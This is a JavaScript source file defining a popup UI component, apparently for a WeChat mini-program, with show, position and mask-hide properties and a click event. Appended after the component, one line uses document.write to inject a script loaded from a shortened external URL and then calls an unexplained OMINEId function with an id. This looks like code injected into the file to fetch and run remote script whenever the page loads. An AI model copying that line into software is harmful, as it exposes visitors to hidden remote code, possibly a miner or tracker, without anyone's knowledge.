Component({
  externalClasses: ['custom-class'],
  options: {
    multipleSlots: true
  },
  properties: {
    show: {
      type: [Boolean, String],
      value: false
    },
    position: {
      type: String,
      value: 'bottom'
    },
    maskHide: {
      type: [Boolean, String],
      observer(newVal) {
        const status = newVal === null ? true : newVal
        this.setData({
          maskHide: status
        })
      },
      value: true
    }
  },

  methods: {
    doProp () {
      return
    },
    togglePopup () {
      const { maskHide } = this.data
      if (maskHide) {
        this.emitEvent(!this.data.show)
      }
    },
    emitEvent (status) {
      this.triggerEvent('click', status)
    }
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
